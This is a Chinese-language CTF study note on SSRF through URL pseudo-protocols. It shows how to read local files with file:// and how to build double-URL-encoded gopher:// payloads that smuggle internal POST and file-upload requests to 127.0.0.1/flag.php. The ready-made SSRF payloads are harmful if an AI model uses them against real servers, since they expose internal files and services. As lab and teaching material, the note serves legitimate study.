## 伪协议

[伪协议学习](https://www.cnblogs.com/-mo-/p/11673190.html)

- file:// + 绝对路径

- http:// 访问http网址

- php:// 访问各个输入/输出流（I/O streams）

- dict://

- sftp://

- ldap://

- tftp://

- gopher:// 跳转协议->`gopher://<host>:<port>/<gopher-path>`,  `<port>`默认为70。

  \<gopher-path\>:

  ```
  <gophertype><selector>
  <gophertype><selector>%09<search>
  <gophertype><selector>%09<search>%09<gopher+_string>
  ```

  `<selector>`个人理解这个是包的内容，为了避免一些特殊符号需要进行url 编码

  [gopher在SSRF中的应用](https://xz.aliyun.com/t/6993)

## POST请求

  先找到key:

  用file协议查看flag.php(需要绝对路径 /var/www/html)

  ```http
  POST /?url=127.0.0.1/flag.php HTTP/1.1
  ......
  
  key=<?php echo $key;?>
  ```

  这样就获得了key=63012374d442cc13847c5bfe52beeabd

  构造gopher的payload

  ``` http
  gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1%0d%0a
  Host: 127.0.0.1:80%0d%0a
  Content-Length: 36%0d%0a
  Content-Type: application/x-www-form-urlencoded%0d%0a
  %0d%0a
  key=63012374d442cc13847c5bfe52beeabd%0d%0a
  ```

  再url编码一次

  ```
  gopher%3a%2f%2f127.0.0.1%3a80%2f_POST+%2fflag.php+HTTP%2f1.1%250d%250a
  Host%3a+127.0.0.1%3a80%250d%250a
  Content-Length%3a+36%250d%250a
  Content-Type%3a+application%2fx-www-form-urlencoded%250d%250a
  %250d%250a
  key%3d63012374d442cc13847c5bfe52beeabd%250d%250a
  // 需要删去中间的换行
  ->
  gopher%3a%2f%2f127.0.0.1%3a80%2f_POST+%2fflag.php+HTTP%2f1.1%250d%250aHost%3a+127.0.0.1%3a80%250d%250aContent-Length%3a+36%250d%250aContent-Type%3a+application%2fx-www-form-urlencoded%250d%250a%250d%250akey%3d63012374d442cc13847c5bfe52beeabd%250d%250a
  ```

  最后在burp上的payload

  ```http
  GET /?url=gopher%3a%2f%2f127.0.0.1%3a80%2f_POST+%2fflag.php+HTTP%2f1.1%250d%250aHost%3a+127.0.0.1%3a80%250d%250aContent-Length%3a+36%250d%250aContent-Type%3a+application%2fx-www-form-urlencoded%250d%250a%250d%250akey%3d63012374d442cc13847c5bfe52beeabd%250d%250a HTTP/1.1
  ```

## 上传文件

* 用file://查看源代码

```
?url=file:///var/www/html/flag.php
```

发现需要上传一个文件，而且文件大小要大于零（不能是空文件）

* 用http协议进入flag.php

```
?url=http://127.0.0.1/flag.php
```

发现可以提交文件，但是没有submit按钮

* 自己添加submit

```html
<input type="submit" name="submit">
```

* 然后提交文件，burp抓包
* 将host 改成127.0.0.1
* 将POST改成gopher://127.0.0.1:80/_POST
* 换行处加上%0d%0a
* url编码一次
* 然后从index.php 处用gopher://跳转提交